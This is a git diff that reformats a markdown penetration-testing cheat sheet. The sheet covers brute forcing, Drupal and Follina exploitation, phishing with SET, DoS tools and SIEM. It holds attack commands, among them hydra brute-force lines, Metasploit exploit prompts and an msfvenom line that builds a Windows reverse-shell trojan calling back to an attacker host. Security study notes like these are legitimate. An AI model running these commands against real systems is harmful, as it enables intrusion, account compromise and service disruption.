@@ -10,8 +10,8 @@ hydra -L users.txt -P pass.txt IP_ADDRESS ftp -V
 https://www.snort.org/
 
 ## How to Check What Ports are Opened on Your PC?
- ▪ Windows: netstat –an, netstat –antb
- ▪ Unix: ss -nltp, netstat –tulpn
+▪ Windows: netstat –an, netstat –antb <br />
+▪ Unix: ss -nltp, netstat –tulpn <br />
 
 # JWT Token Vulnerability
 ```sh
@@ -21,8 +21,7 @@ sudo -l
 ```
 
 ## How to Search for Vulnerabilities?
-ExploitDB
-https://www.exploit-db.com/
+**More details for ExploitDB:** https://www.exploit-db.com/
 
 
 ## Drupal7  (Versions 7.0 to 7.31 are vulnerable to SQL Injection)
@@ -41,7 +40,7 @@ msf6 exploit(multi/http/drupal_drupageddon) > exploit
 
 ▪ Using hydra (https://github.com/vanhauser-thc/thc-hydra)
 
-Let's see more: 
+**More details at:** 
 
 ▪ https://hashcat.net/wiki/doku.php?id=example_hashes <br />
 ▪ https://crackstation.net <br />
@@ -57,15 +56,14 @@ https://0day.today
 ```sh
 python3 follina.py -r 9999
 ```
-More Details at: https://www.hackthebox.com/blog/cve-2022-30190-follina-explained
 
+**More Details at:** https://www.hackthebox.com/blog/cve-2022-30190-follina-explained
 
 ## More Databases for Vulnerabilities:
-
- ▪https://www.cve.org/ <br />
- ▪https://www.exploit-db.com/ <br />
- ▪https://nvd.nist.gov/ <br />
- ▪https://www.cvedetails.com <br />
+▪ https://www.cve.org/ <br />
+▪ https://www.exploit-db.com/ <br />
+▪ https://nvd.nist.gov/ <br />
+▪ https://www.cvedetails.com <br />
 
 # Frameworks to Perform Wi-Fi Attacks
 
@@ -76,9 +74,11 @@ More Details at: https://www.hackthebox.com/blog/cve-2022-30190-follina-explaine
 ```sh 
 python listener.py
 ```
+
 **More details at:**: https://www.youtube.com/watch?v=A8DkVDQW1-w
 
 Technical Side of Phishing Attacks is Scary Easy to Replicate <br />
+
 **More details at:** https://github.com/trustedsec/social-engineer-toolkit
 
 ```sh
@@ -100,7 +100,7 @@ Select from the menu:
 
 set> 2
 
-Denial of Service (DOS)is the easiest to perform attack
+## Denial of Service (DOS)is the easiest to perform attack
 
 LOIC (https://sourceforge.net/projects/loic/)–TCP, UDP, HTTP    <br />
 GET FLOODS   <br /> 
@@ -113,8 +113,10 @@ GET FLOODS   <br />
 ## How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?
 
 MSFvenom (MSFvenom-MetasploitUnleashed (offensive security.com))   <br />
- ▪msfvenom–p windows/x64/shell/reverse_tcpLHOST=IP    <br />
-LPORT=PORT –f exe –o file.exe   <br />
+```sh
+msfvenom–p windows/x64/shell/reverse_tcpLHOST=IP
+LPORT=PORT –f exe –o file.exe
+```
 
 # Ransomware
 
@@ -133,10 +135,10 @@ msf6 exploit(multi/http/drupal_drupageddon) > exploit
 ```
 
 # Brute Forcing Attacks   <br />
- ▪Example software for performing the attack:   <br />
- ▪THC-Hydra: https://github.com/vanhauser-thc/thchydra   <br />
- ▪Burp Intruder: https://portswigger.net/burp/pro   <br />
- ▪Medusa: https://github.com/jmk-foofus/medusa   <br />
+▪ Example software for performing the attack:   <br />
+▪ THC-Hydra: https://github.com/vanhauser-thc/thchydra   <br />
+▪ Burp Intruder: https://portswigger.net/burp/pro   <br />
+▪ Medusa: https://github.com/jmk-foofus/medusa   <br />
 
 # Security Information and Event Management - SIEM for Securty analysis
 QRadar SIEM Demo
@@ -146,7 +148,7 @@ QRadar SIEM Demo
 ps -aef --forest
 ```
 
- ▪Analyzing Sliver C2 HTTP Beacon with Wireshark:
+▪ Analyzing Sliver C2 HTTP Beacon with Wireshark:
 
 # Penetration Testing Operational Systems (OS)
 ▪ Kali Linux (https://www.kali.org)   <br />
